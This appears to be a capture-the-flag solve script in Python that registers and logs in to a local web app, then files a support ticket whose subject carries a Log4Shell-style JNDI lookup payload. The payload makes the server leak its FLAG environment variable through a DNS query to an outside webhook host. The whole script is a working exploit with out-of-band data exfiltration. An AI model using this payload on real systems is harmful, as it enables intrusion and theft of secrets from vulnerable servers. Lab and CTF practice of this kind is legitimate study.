import http.cookiejar
import re
import secrets
import urllib.parse
import urllib.request

TARGET = "http://localhost:15144"
WEBHOOK_HOST = "c42cba2b-55fc-4ce6-8589-d5be4216668b.dnshook.site"


def csrf(html):
    return re.findall(r'name="_csrf" value="([^"]+)"', html)[0]


def request(opener, url, fields=None):
    data = urllib.parse.urlencode(fields).encode() if fields is not None else None
    with opener.open(url, data=data, timeout=20) as response:
        return response.url, response.read().decode()

subject = f"${{jndi:dns:/${{env:FLAG}}.{WEBHOOK_HOST}}}"
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
)
username = "ctf" + secrets.token_hex(5)
password = secrets.token_urlsafe(18)
_, page = request(opener, TARGET + "/register")
request(opener, TARGET + "/register", {
    "_csrf": csrf(page), "username": username, "password": password,
})
_, page = request(opener, TARGET + "/login")
request(opener, TARGET + "/login", {
    "_csrf": csrf(page), "username": username, "password": password,
})
_, page = request(opener, TARGET + "/tickets/new")
request(opener, TARGET + "/tickets", {
    "_csrf": csrf(page), "subject": subject,
    "content": "Support request", "category": "GENERAL",
})
print("Sent DNS lookup:", subject)
